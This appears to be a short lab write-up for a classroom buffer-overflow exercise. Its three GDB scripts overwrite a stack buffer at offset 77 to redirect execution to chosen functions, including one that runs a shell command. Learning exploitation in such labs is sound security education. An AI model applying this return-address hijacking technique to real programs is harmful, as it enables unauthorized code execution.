We created a GDB Script for each of the three scenarios.

Part 1: buffer overflow the program to create the file "uid_[uid]_crack" in the directory where the program is run.

Part 2: buffer overflow the program to create the file "uid_[uid]_crack_advanced" in the directory where the program is run.

Part 3: buffer overflow the program to set the value of a function pointer in "function_pointer_function" to perform a shell command. 

Part 1 Solution:
We found the offset from test to the ebp pointer to be 77. We then determined the location of the log_result function to be 0x080486a5. Using the offset we simulated a buffer overflow by setting the individual bytes of the ebp pointer to the location of 0x080486a5.

break test
run abc
set test [77] = 0xa5
set test [78] = 0x86
set test [79] = 0x04
set test [80] = 0x08


Part 2 Solution: 
Using the same offset from test to the ebp pointer, we then determined the offset from the ebp pointer to the where the parameters for log_result_advanced will be. Finally we determined the location of the log_result_advanced to be 0x080486d4.

break test	
run abc
set test [77] = 0xd4
set test [78] = 0x86
set test [79] = 0x04
set test [80] = 0x08
set test [85] = 0xde
set test [86] = 0xad
set test [87] = 0xbe
set test [88] = 0xef
continue

Part 3 Solution:
Using the same offset from test to the ebp pointer, and the same offset for the parameters, we then find the location of the function_pointer_function to be 0x080487bc.

break test	
run abc
set test [77] = 0xbc
set test [78] = 0x87
set test [79] = 0x04
set test [80] = 0x08
set test [85] = 0xdf
set test [86] = 0x87
set test [87] = 0x04
set test [88] = 0x08
continue
